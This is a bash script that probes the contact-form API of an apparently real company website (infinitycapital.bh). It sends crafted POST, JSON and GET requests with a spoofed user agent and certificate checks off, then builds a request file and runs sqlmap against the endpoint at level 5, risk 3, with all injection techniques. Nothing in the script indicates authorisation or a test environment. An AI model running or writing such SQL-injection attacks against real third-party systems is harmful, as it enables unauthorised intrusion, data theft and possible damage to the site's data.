#!/bin/bash
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
T="https://www.infinitycapital.bh/api/send"
echo "=== 1. plain POST valid body ==="
curl -sk -A "$UA" -m 25 -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'fname=D10&lname=Probe&telInput=1234567&cname=QA&msgTxt=hello&check=' \
  -w "\nHTTP=%{http_code} sz=%{size_download} t=%{time_total}\n" "$T"
echo "=== 2. JSON POST ==="
curl -sk -A "$UA" -m 25 -X POST -H 'Content-Type: application/json' \
  -d '{"fname":"D10","lname":"Probe","msgTxt":"hello"}' \
  -w "\nHTTP=%{http_code} sz=%{size_download} t=%{time_total}\n" "$T"
echo "=== 3. GET for comparison ==="
curl -sk -A "$UA" -m 25 -X GET -w "\nHTTP=%{http_code} sz=%{size_download}\n" "$T"
echo "=== 4. sqlmap request file setup ==="
cat > /tmp/send.req <<'EOF'
POST /api/send HTTP/1.1
Host: www.infinitycapital.bh
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*

fname=D10&lname=Probe&telInput=1234567&cname=QA&msgTxt=hello&check=
EOF
echo "wrote /tmp/send.req"
echo "=== 5. sqlmap via -r ==="
sqlmap -r /tmp/send.req --batch --level=5 --risk=3 --threads=2 --timeout=20 --retries=1 \
  --output-dir=/tmp/sqlmap_out --technique=BEUSTQ 2>&1 | tail -40
